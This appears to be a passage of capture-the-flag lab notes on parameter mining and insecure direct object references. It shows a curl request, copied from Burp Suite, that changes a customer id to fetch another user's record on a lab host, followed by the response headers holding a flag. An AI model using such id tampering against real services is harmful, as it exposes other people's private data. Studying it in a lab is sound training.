### *Parameter Mining*
Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to `/user/details` displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called `user_id` that you can use to display other users' information, for example, `/user/details?user_id=123`.
### *API request*
Find an API request using an id. In Burp suite, copy the request as a curl command, edit the id.
```
curl -i -s -k -X $'GET'     -H $'Host: 10-10-1-17.p.thmlabs.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://10-10-1-17.p.thmlabs.com/customers/account' -H $'X-Requested-With: XMLHttpRequest' -H $'Dnt: 1' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Te: trailers' -H $'Connection: close'     -b $'admin=false; session=d59284ca606d8dddb489e93d7030c21d'     $'https://10-10-1-17.p.thmlabs.com/api/v1/customer?id=3'
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 01 Apr 2024 20:31:45 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: close
X-FLAG: THM{HEADER_FLAG}
Set-Cookie: session=d59284ca606d8dddb489e93d7030c21d; expires=Mon, 01-Apr-2024 21:31:45 GMT; Max-Age=3600; path=
```